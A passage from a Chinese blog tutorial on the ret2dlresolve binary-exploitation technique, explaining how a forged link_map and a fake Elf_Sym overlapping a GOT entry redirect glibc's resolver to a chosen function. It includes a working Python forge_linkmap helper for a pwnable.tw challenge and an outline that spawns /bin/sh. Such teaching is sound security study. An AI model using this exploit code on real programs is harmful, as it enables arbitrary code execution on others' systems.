+<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a>                           <span class="co">/* total size (bytes):   24 */</span></span>
+<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a><span class="op">}</span>Elf64_Sym<span class="op">;</span></span></code></pre></div>
+<p>然后我们再在在<code>got表</code>附近“构造”的<code>Elf_Sym</code>结构体，准确地说是恰好让结构体中的<code>st_value</code>的区域和<code>func B</code>的<code>got表项</code>重合，即借用<code>GOT表项</code>，(<em>请读者仔细阅读上面这句话</em>)，那么此时(假设为64位)的<code>Elf_Sym</code>中的<code>st_name</code>和<code>st_other</code>字段将与<code>func B</code>的上一个GOT表项重合。</p>
+<p>构造示意图如下：</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--4.Partial-RELRO.No-Leak.png" alt="ret2dlresolve--4.Partial-RELRO.No-Leak">
+<figcaption aria-hidden="true">ret2dlresolve--4.Partial-RELRO.No-Leak</figcaption>
+</figure>
+<p><strong>那么我们为什么要这么构造呢？</strong></p>
+<p>此时解析出来的<code>value</code>则为：</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="co">// RVA:相对虚拟地址，即函数虚拟地址相对于所处文件的加载基址的差</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="co">// VA: 虚拟地址，即函数加载到程序空间中的虚拟地址</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>value <span class="op">=</span> l<span class="op">-&gt;</span>l_addr <span class="op">+</span> sym<span class="op">-&gt;</span>st_value</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>      <span class="op">=</span> <span class="op">(</span> RVA<span class="op">(</span>func A<span class="op">)</span> <span class="op">-</span> RVA<span class="op">(</span>func B<span class="op">)</span> <span class="op">)</span> <span class="op">+</span> VA<span class="op">(</span>func B<span class="op">)</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>      <span class="op">=</span> RVA<span class="op">(</span>func A<span class="op">)</span> <span class="op">+</span> <span class="op">(</span>VA<span class="op">(</span>func B<span class="op">)</span> <span class="op">-</span> RVA<span class="op">(</span>func B<span class="op">))</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>      <span class="op">=</span> RVA<span class="op">(</span>func A<span class="op">)</span> <span class="op">+</span> Libc_base</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>      <span class="op">=</span> VA<span class="op">(</span>func A<span class="op">)</span></span></code></pre></div>
+<p>多么巧妙的构造！（<em>没看明白的读者建议多阅读几遍该小节</em>）</p>
+<p><code>dl_fixup</code>得出的结果<code>value</code>
+“正好”是我们所需要的地址，即<code>dl_fixup</code>成功“计算出”了我们想要的恶意函数A的地址，那么接下来<code>dl_runtime_resolve</code>就会调用该地址所在的函数，目的达成。</p>
+<p>而让伪造的<code>Elf_Sym</code>结构体落在<code>GOT表</code>附近是非常简单的，只需要在我们伪造<code>Elf_Dyn</code>时（希望读者没有忘记，这个结构体是保存各个节基址的键值对），将关键字<code>DT_SYMTAB</code>的值指向GOT表附近即可。</p>
+<p>那么如果我们要保证<code>st_other</code>不为0，那么在64位下，需要<code>func B</code>的<code>got表项</code>的上一项必须已经初始化，并且第6个字节(索引为5)不为0，否则<code>st_other</code>还是0，没法走到else分支；</p>
+<p>庆幸的是，64位下的GOT表项一般初始化后的的值类似于<code>0x7feefa1c6000</code>之类的值，即第6个字节为<code>0x7f</code>，那么此时我们的<code>st_other</code>不为0，满足条件。</p>
+<p>同理，若想在32位下进行攻击，则需要保证<code>func B</code>的<code>got表项</code>的
+<strong>下两项</strong> 已经初始化且该项的第2个字节(索引为1)不为0。</p>
+<p>（32位和64位要求不同的根本原因就是<code>Elf32_Sym</code>和<code>Elf64_Sym</code>的字段顺序不同）</p>
+<h5 id="利用-2">2.3.2 利用</h5>
+<p>我们需要伪造我们自己的<code>link_map</code>，并将这些指针中的关键的部分指向我们<code>link_map</code>内部或者上述的<code>GOT表项</code>以减少<code>payload</code>大小，毕竟再一次地，可控区域一般情况下有限，<code>payload</code>越短越好。那么此时<strong>我们可以简单化地将各类节和条目之前的偏移设置为0</strong>（如<code>offset</code>，<code>r_info</code>中的<code>index</code>，一是方便计算，二是可以紧凑得压缩payload长度。</p>
+<p>至此我们可以得出以下的构造方式（方式不唯一，知道原理即可得出自己的构造方式）：</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--4.Partial-RELRO.No-Leak.2.png" alt="ret2dlresolve--4.Partial-RELRO.No-Leak.2">
+<figcaption aria-hidden="true">ret2dlresolve--4.Partial-RELRO.No-Leak.2</figcaption>
+</figure>
+<p>我自己写的利用代码如下，用作伪造<code>link_map</code>仅供参考：</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co">#pwnable.tw unexploitable </span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> forge_linkmap(linkmap_addr, known_libc_RVA, call_libc_RVA, known_elf_got_VA, arch<span class="op">=</span><span class="st">&#39;x64&#39;</span>,custom_data<span class="op">=</span><span class="st">b&quot;&quot;</span>):</span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">assert</span> <span class="bu">isinstance</span>(custom_data, <span class="bu">bytes</span>)</span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>    DT_STRTAB <span class="op">=</span> <span class="dv">5</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>    DT_SYMTAB <span class="op">=</span> <span class="dv">6</span></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a>    DT_JMPREL <span class="op">=</span> <span class="dv">23</span></span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a>    l_addr <span class="op">=</span> call_libc_RVA <span class="op">-</span> known_libc_RVA</span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a>    custom_data_addr <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a>    fake_rel_entry <span class="op">=</span> <span class="st">b&quot;&quot;</span>   <span class="co"># fake entry</span></span>
+<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a>    writable_addr <span class="op">=</span> <span class="dv">0</span>      <span class="co"># got rewrite addr, must writable</span></span>
+<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a>    padding_byte <span class="op">=</span> <span class="st">b&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span></span>
+<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> arch<span class="op">==</span><span class="st">&#39;x64&#39;</span>:</span>
+<span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a>        sizes <span class="op">=</span> {</span>
+<span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;size_t&quot;</span>:<span class="bn">0x8</span>,</span>
+<span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;l_addr&quot;</span>:<span class="bn">0x8</span>,</span>
+<span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;l_info_offset&quot;</span>:<span class="bn">0x40</span>,</span>
+<span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Elf_Dyn&quot;</span>:<span class="bn">0x10</span>,</span>
+<span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Elf_Rel&quot;</span>:<span class="bn">0x18</span>,</span>
+<span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Elf_Sym&quot;</span>:<span class="bn">0x18</span>,</span>
+<span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a>        pck <span class="op">=</span> p64</span>
+<span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a>        writable_addr <span class="op">=</span> linkmap_addr <span class="op">+</span> sizes[<span class="st">&#39;l_info_offset&#39;</span>] <span class="op">-</span> sizes[<span class="st">&#39;size_t&#39;</span>]</span>
+<span id="cb22-29"><a href="#cb22-29" aria-hidden="true" tabindex="-1"></a>        fake_rel_entry <span class="op">=</span> pck(writable_addr) <span class="op">+</span> pck(<span class="dv">7</span>) <span class="op">+</span> pck(<span class="dv">0</span>) <span class="co"># r_offset + r_info + r_addend : got_VA=writable_addr + &lt;INDEX=0&gt;|&lt;TYPE=7&gt; + whatever</span></span>
+<span id="cb22-30"><a href="#cb22-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb22-31"><a href="#cb22-31" aria-hidden="true" tabindex="-1"></a>        sizes <span class="op">=</span> {</span>
+<span id="cb22-32"><a href="#cb22-32" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;size_t&quot;</span>:<span class="bn">0x4</span>,</span>
+<span id="cb22-33"><a href="#cb22-33" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;l_addr&quot;</span>:<span class="bn">0x4</span>,</span>
+<span id="cb22-34"><a href="#cb22-34" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;l_info_offset&quot;</span>:<span class="bn">0x20</span>,</span>
+<span id="cb22-35"><a href="#cb22-35" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Elf_Dyn&quot;</span>:<span class="bn">0x8</span>,</span>
+<span id="cb22-36"><a href="#cb22-36" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Elf_Rel&quot;</span>:<span class="bn">0x8</span>,</span>
+<span id="cb22-37"><a href="#cb22-37" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Elf_Sym&quot;</span>:<span class="bn">0x10</span>,</span>
+<span id="cb22-38"><a href="#cb22-38" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb22-39"><a href="#cb22-39" aria-hidden="true" tabindex="-1"></a>        pck <span class="op">=</span> p32</span>
+<span id="cb22-40"><a href="#cb22-40" aria-hidden="true" tabindex="-1"></a>        writable_addr <span class="op">=</span> linkmap_addr <span class="op">+</span> sizes[<span class="st">&#39;l_info_offset&#39;</span>] <span class="op">-</span> sizes[<span class="st">&#39;size_t&#39;</span>]</span>
+<span id="cb22-41"><a href="#cb22-41" aria-hidden="true" tabindex="-1"></a>        fake_rel_entry <span class="op">=</span> pck(writable_addr) <span class="op">+</span> pck(<span class="dv">7</span>) <span class="co"># r_offset + r_info : got_VA=writable_addr + &lt;INDEX=0&gt;|&lt;TYPE=7&gt;</span></span>
+<span id="cb22-42"><a href="#cb22-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-43"><a href="#cb22-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-44"><a href="#cb22-44" aria-hidden="true" tabindex="-1"></a>    l_info_offset <span class="op">=</span> <span class="kw">lambda</span> idx : sizes[<span class="st">&quot;l_info_offset&quot;</span>] <span class="op">+</span> idx<span class="op">*</span>sizes[<span class="st">&quot;size_t&quot;</span>]</span>
+<span id="cb22-45"><a href="#cb22-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-46"><a href="#cb22-46" aria-hidden="true" tabindex="-1"></a>    <span class="co"># fill in l_info.</span></span>
+<span id="cb22-47"><a href="#cb22-47" aria-hidden="true" tabindex="-1"></a>    <span class="co"># e.g. l_info[DT_STRTAB] = fake_dyn_strtab_entry_addr</span></span>
+<span id="cb22-48"><a href="#cb22-48" aria-hidden="true" tabindex="-1"></a>    fake_dyn_strtab_entry_addr <span class="op">=</span> linkmap_addr               <span class="op">+</span> sizes[<span class="st">&#39;l_addr&#39;</span> ]</span>
+<span id="cb22-49"><a href="#cb22-49" aria-hidden="true" tabindex="-1"></a>    fake_dyn_jmprel_entry_addr <span class="op">=</span> fake_dyn_strtab_entry_addr <span class="op">+</span> sizes[<span class="st">&#39;Elf_Dyn&#39;</span>]</span>
+<span id="cb22-50"><a href="#cb22-50" aria-hidden="true" tabindex="-1"></a>    fake_dyn_symtab_entry_addr <span class="op">=</span> fake_dyn_jmprel_entry_addr <span class="op">+</span> sizes[<span class="st">&#39;Elf_Dyn&#39;</span>]</span>
+<span id="cb22-51"><a href="#cb22-51" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-52"><a href="#cb22-52" aria-hidden="true" tabindex="-1"></a>    fake_str_entry_addr <span class="op">=</span> <span class="dv">0</span>                                             <span class="co"># dlresolve: func str addr whatever</span></span>
+<span id="cb22-53"><a href="#cb22-53" aria-hidden="true" tabindex="-1"></a>    fake_rel_entry_addr <span class="op">=</span> linkmap_addr <span class="op">+</span> sizes[<span class="st">&#39;l_info_offset&#39;</span>]         <span class="co"># avoid program crash, must writable</span></span>
+<span id="cb22-54"><a href="#cb22-54" aria-hidden="true" tabindex="-1"></a>    fake_sym_entry_addr <span class="op">=</span> known_elf_got_VA <span class="op">-</span> sizes[<span class="st">&#39;size_t&#39;</span>]            <span class="co"># dlresolve: got entry and fake sym entry overlap</span></span>
+<span id="cb22-55"><a href="#cb22-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-56"><a href="#cb22-56" aria-hidden="true" tabindex="-1"></a>    fake_dyn_strtab_entry <span class="op">=</span> pck(DT_STRTAB) <span class="op">+</span> pck(fake_str_entry_addr) <span class="co"># Elf_Dyn: d_tag + d_ptr</span></span>
+<span id="cb22-57"><a href="#cb22-57" aria-hidden="true" tabindex="-1"></a>    fake_dyn_symtab_entry <span class="op">=</span> pck(DT_SYMTAB) <span class="op">+</span> pck(fake_sym_entry_addr) <span class="co"># Elf_Dyn: d_tag + d_ptr</span></span>
+<span id="cb22-58"><a href="#cb22-58" aria-hidden="true" tabindex="-1"></a>    fake_dyn_jmprel_entry <span class="op">=</span> pck(DT_JMPREL) <span class="op">+</span> pck(fake_rel_entry_addr) <span class="co"># Elf_Dyn: d_tag + d_ptr</span></span>
+<span id="cb22-59"><a href="#cb22-59" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-60"><a href="#cb22-60" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-61"><a href="#cb22-61" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Forge fake linkmap struct</span></span>
+<span id="cb22-62"><a href="#cb22-62" aria-hidden="true" tabindex="-1"></a>    linkmap  <span class="op">=</span> pck(l_addr)                       <span class="co"># diff between func A and func B: call_RVA - known_RVA</span></span>
+<span id="cb22-63"><a href="#cb22-63" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Three fake dyn entry</span></span>
+<span id="cb22-64"><a href="#cb22-64" aria-hidden="true" tabindex="-1"></a>    linkmap <span class="op">+=</span> fake_dyn_strtab_entry             <span class="co"># point to fake_str_entry</span></span>
+<span id="cb22-65"><a href="#cb22-65" aria-hidden="true" tabindex="-1"></a>    linkmap <span class="op">+=</span> fake_dyn_jmprel_entry             <span class="co"># point to fake_rel_entry</span></span>
+<span id="cb22-66"><a href="#cb22-66" aria-hidden="true" tabindex="-1"></a>    linkmap <span class="op">+=</span> fake_dyn_symtab_entry             <span class="co"># point to fake_sym_entry which overlaps with got entry</span></span>
+<span id="cb22-67"><a href="#cb22-67" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-68"><a href="#cb22-68" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Padding until l_info array start</span></span>
+<span id="cb22-69"><a href="#cb22-69" aria-hidden="true" tabindex="-1"></a>    linkmap  <span class="op">=</span> linkmap.ljust(sizes[<span class="st">&quot;l_info_offset&quot;</span>],padding_byte)</span>
+<span id="cb22-70"><a href="#cb22-70" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-71"><a href="#cb22-71" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Insert fake str entry before l_info[DT_STRTAB]</span></span>
+<span id="cb22-72"><a href="#cb22-72" aria-hidden="true" tabindex="-1"></a>    linkmap <span class="op">+=</span> fake_rel_entry                    <span class="co"># l_info[0]</span></span>
+<span id="cb22-73"><a href="#cb22-73" aria-hidden="true" tabindex="-1"></a>    linkmap  <span class="op">=</span> linkmap.ljust(l_info_offset(DT_STRTAB), padding_byte)</span>
+<span id="cb22-74"><a href="#cb22-74" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-75"><a href="#cb22-75" aria-hidden="true" tabindex="-1"></a>    <span class="co"># l_info list: each element is a pointer to a specific Elf_Dyn entry</span></span>
+<span id="cb22-76"><a href="#cb22-76" aria-hidden="true" tabindex="-1"></a>    linkmap <span class="op">+=</span> pck(fake_dyn_strtab_entry_addr)   <span class="co"># l_info[DT_STRTAB], just readable addr actually </span></span>
+<span id="cb22-77"><a href="#cb22-77" aria-hidden="true" tabindex="-1"></a>    linkmap <span class="op">+=</span> pck(fake_dyn_symtab_entry_addr)   <span class="co"># l_info[DT_SYMTAB]</span></span>
+<span id="cb22-78"><a href="#cb22-78" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-79"><a href="#cb22-79" aria-hidden="true" tabindex="-1"></a>    <span class="co"># now we should padding and considering where the custom_data should be placed</span></span>
+<span id="cb22-80"><a href="#cb22-80" aria-hidden="true" tabindex="-1"></a>    padding_size <span class="op">=</span> l_info_offset(DT_JMPREL) <span class="op">-</span> l_info_offset(DT_SYMTAB) <span class="op">-</span> sizes[<span class="st">&#39;size_t&#39;</span>]</span>
+<span id="cb22-81"><a href="#cb22-81" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-82"><a href="#cb22-82" aria-hidden="true" tabindex="-1"></a>    <span class="co"># if padding is big enough for custom_data, place it</span></span>
+<span id="cb22-83"><a href="#cb22-83" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="bu">len</span>(custom_data)<span class="op">&lt;=</span>padding_size):</span>
+<span id="cb22-84"><a href="#cb22-84" aria-hidden="true" tabindex="-1"></a>        linkmap <span class="op">+=</span> custom_data</span>
+<span id="cb22-85"><a href="#cb22-85" aria-hidden="true" tabindex="-1"></a>        custom_data_addr <span class="op">=</span> linkmap_addr <span class="op">+</span>  l_info_offset(DT_SYMTAB) <span class="op">+</span> sizes[<span class="st">&#39;size_t&#39;</span>]</span>
+<span id="cb22-86"><a href="#cb22-86" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb22-87"><a href="#cb22-87" aria-hidden="true" tabindex="-1"></a>    linkmap  <span class="op">=</span> linkmap.ljust(l_info_offset(DT_JMPREL),padding_byte)</span>
+<span id="cb22-88"><a href="#cb22-88" aria-hidden="true" tabindex="-1"></a>    linkmap <span class="op">+=</span> pck(fake_dyn_jmprel_entry_addr)   <span class="co"># l_info[DT_JMPREL]</span></span>
+<span id="cb22-89"><a href="#cb22-89" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-90"><a href="#cb22-90" aria-hidden="true" tabindex="-1"></a>    <span class="co"># otherwise, place custom_data on the bottom</span></span>
+<span id="cb22-91"><a href="#cb22-91" aria-hidden="true" tabindex="-1"></a>    <span class="co"># it will enlarge fake link_map size</span></span>
+<span id="cb22-92"><a href="#cb22-92" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="bu">len</span>(custom_data)<span class="op">&gt;</span>padding_size):</span>
+<span id="cb22-93"><a href="#cb22-93" aria-hidden="true" tabindex="-1"></a>        linkmap <span class="op">+=</span> custom_data</span>
+<span id="cb22-94"><a href="#cb22-94" aria-hidden="true" tabindex="-1"></a>        custom_data_addr <span class="op">=</span> linkmap_addr <span class="op">+</span>  l_info_offset(DT_JMPREL) <span class="op">+</span> sizes[<span class="st">&#39;size_t&#39;</span>]</span>
+<span id="cb22-95"><a href="#cb22-95" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-96"><a href="#cb22-96" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> linkmap, custom_data_addr</span></code></pre></div>
+<p>那么利用的思路大致为:</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co">&quot;&quot;&quot;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="co">writable_addr    = 可控区域</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="co">known_libc_RVA   = 已解析的函数在ELF中的偏移，如elf.sym[&#39;__libc_start_main&#39;]</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="co">call_libc_RVA    = 想要解析的函数在ELF中的偏移，如elf.sym[&#39;execve&#39;]</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="co">known_elf_got_VA = 已解析的函数对应的GOT表项在内存中的虚拟地址 </span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="co">&quot;&quot;&quot;</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a>custom_data <span class="op">=</span> <span class="st">b&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a>fake_link_map,custom_data_addr <span class="op">=</span> forge_linkmap(writable_addr, known_libc_RVA, call_libc_RVA, known_elf_got_VA, custom_data<span class="op">=</span>custom_data, arch<span class="op">=</span><span class="st">&#39;x64&#39;</span>)</span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a><span class="co"># 将伪造的link_map写入可控区域</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a>your_write(writable_addr,fake_link_map)</span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a><span class="co"># 构造传入参数，假设为调用execve(&quot;bin/sh&quot;,0,0)</span></span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a>pass_arg(rdi<span class="op">=</span>custom_data_addr,rsi<span class="op">=</span><span class="dv">0</span>,rdx<span class="op">=</span><span class="dv">0</span>)</span>
+<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 调用_dl_runtime_resolve</span></span>
+<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a>调用_dl_runtime_resolve(link_map_addr<span class="op">=</span>writable_addr, offset<span class="op">=</span><span class="dv">0</span>)</span></code></pre></div>
+<h5 id="一些细节的讨论">2.3.3一些细节的讨论</h5>
+<p>可能有些读者注意到了一个细节，如果我们将<code>Elf_Sym</code>结构体伪造在<code>GOT</code>表中，那么若按照上述的构造方式来说，<code>st_other</code>和<code>st_info</code>确实是满足了，但是作为字符串与字符表偏移的<code>st_name</code>是不可控的（即由GOT表项的值所决定），由于函数字符串地址是由<code>strtab_addr + st_name</code>得到的，万一<code>st_name</code>特别大，使得计算结果落在不可读的区域，那么是不是也会造成程序崩溃呢？那么我们是不是要利用任意写，将上一项(64bit)或者下两项(32bit)表项改成0呢？</p>
+<p>通过阅读<code>_dl_fixup()</code>源码我们可以说，这种担心是没有必要的：</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co">//  source/elf/dl-runtime.c</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="co">/* Construct a value of type DL_FIXUP_VALUE_TYPE from a code address</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="co">   and a link map.  */</span>                                              </span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)  </span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>_dl_fixup<span class="op">(){</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 读出Dyn结构体中各节的基址，如symtab，strtab</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> ElfW<span class="op">(</span>Sym<span class="op">)</span> <span class="op">*</span><span class="dt">const</span> symtab <span class="op">=</span> <span class="op">(</span><span class="dt">const</span> <span class="dt">void</span> <span class="op">*)</span> D_PTR <span class="op">(</span>l<span class="op">,</span> l_info<span class="op">[</span>DT_SYMTAB<span class="op">]);</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> <span class="dt">char</span> <span class="op">*</span>strtab <span class="op">=</span> <span class="op">(</span><span class="dt">const</span> <span class="dt">void</span> <span class="op">*)</span> D_PTR <span class="op">(</span>l<span class="op">,</span> l_info<span class="op">[</span>DT_STRTAB<span class="op">]);</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 读出Sym结构体中的数据</span></span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> PLTREL <span class="op">*</span><span class="dt">const</span> reloc <span class="op">=</span> <span class="op">(</span><span class="dt">const</span> <span class="dt">void</span> <span class="op">*)</span> <span class="op">(</span>D_PTR <span class="op">(</span>l<span class="op">,</span> l_info<span class="op">[</span>DT_JMPREL<span class="op">])</span> <span class="op">+</span> reloc_offset<span class="op">);</span></span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> ElfW<span class="op">(</span>Sym<span class="op">)</span> <span class="op">*</span>sym <span class="op">=</span> <span class="op">&amp;</span>symtab<span class="op">[</span>ELFW<span class="op">(</span>R_SYM<span class="op">)</span> <span class="op">(</span>reloc<span class="op">-&gt;</span>r_info<span class="op">)];</span></span>
+<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a>    <span class="dt">void</span> <span class="op">*</span><span class="dt">const</span> rel_addr <span class="op">=</span> <span class="op">(</span><span class="dt">void</span> <span class="op">*)(</span>l<span class="op">-&gt;</span>l_addr <span class="op">+</span> reloc<span class="op">-&gt;</span>r_offset<span class="op">);</span></span>
+<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ......                                        </span></span>
+<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 判断符号的可见性                                                                    </span></span>
+<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>__builtin_expect<span class="op">(</span>ELFW<span class="op">(</span>ST_VISIBILITY<span class="op">)(</span>sym<span class="op">-&gt;</span>st_other<span class="op">),</span> <span class="dv">0</span><span class="op">)</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="co">// 我们绕过了该分支！                      </span></span>
+<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span>                                                                                       </span>
+<span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a>                                      </span>
+<span id="cb24-20"><a href="#cb24-20" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ......   </span></span>
+<span id="cb24-21"><a href="#cb24-21" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb24-22"><a href="#cb24-22" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 查询待解析符号所在的目标文件的 link_map </span></span>
+<span id="cb24-23"><a href="#cb24-23" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 此时需要strtab + sym-&gt;st_name找到函数字符串</span></span>
